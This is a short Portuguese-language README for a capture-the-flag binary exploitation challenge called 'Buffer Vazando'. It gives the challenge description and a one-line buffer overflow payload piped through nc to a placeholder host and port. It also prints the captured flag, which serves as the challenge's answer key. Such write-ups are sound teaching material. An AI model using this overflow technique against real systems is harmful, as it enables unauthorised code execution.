# binexp Buffer Vazando

## Descrição do desafio

"Temos um vazamento! Repito, temos um vazamen-!"

Essa foi a ultima mensagem transmitida pelo de seguranca, agora cabe a voce descobrir o que aconteceu com eles. Encontre esse vazamento!

## Descrição da solução

Para a solução completa desse desafio leia o [writeup](writeup.md)

```bash
echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x97\x04\x08' | nc <endereço> <porta>
```

Assim, a flag encontrada:
eits{v1t0r14_1lc4nc4d4!}
